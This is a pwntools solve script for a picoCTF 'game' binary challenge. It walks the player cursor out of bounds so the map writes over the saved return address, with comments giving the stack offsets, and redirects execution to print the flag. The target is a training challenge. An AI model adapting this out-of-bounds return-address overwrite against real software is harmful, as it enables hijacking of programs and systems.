#!/usr/bin/env python3

from pwn import *


exe = ELF("./game", checksec=False)

context.binary = exe


def start():
    if args.LOCAL:
        r = process([exe.path])

        if args.GDB:
            gdb.attach(r, gdbscript="""
                    break *0x08049970
                    break *0x080499fe
                    continue
                """)
    else:
        r = remote("rhea.picoctf.net", 59310)

    return r


def main():
    r = start()

    normal_level = b"aaaaaaaawwwwssssp"

    # Saved return address is at map[0][-51].
    # Index is calculated as "row * 90 + column"
    level_4 = b"aaaaaaaawwwwssss" + b"a" * 47 + b"wwwlpw"

    # Once returned to 0x08049970, $esp is shifted downward by 0x10.
    # This means we have to adjust the payload because now the saved
    # return address will be at map[0][-67]
    level_5 = b"aaaaaaaawwwwssss" + b"a" * 63 + b"wwwl" + p8(0xfe) + b"w"

    for level in range(1, 4):
        r.recvuntil(f"Level: {level}".encode())
        r.send(normal_level)
        r.send(b"\n")

    r.recvuntil(b"Level: 4")
    r.send(level_4)
    r.send(b"\n")

    r.recvuntil(b"Level: 5")
    r.send(level_5)

    r.recvuntil(b"picoCTF")
    flag = "picoCTF" + r.recvline().strip().decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()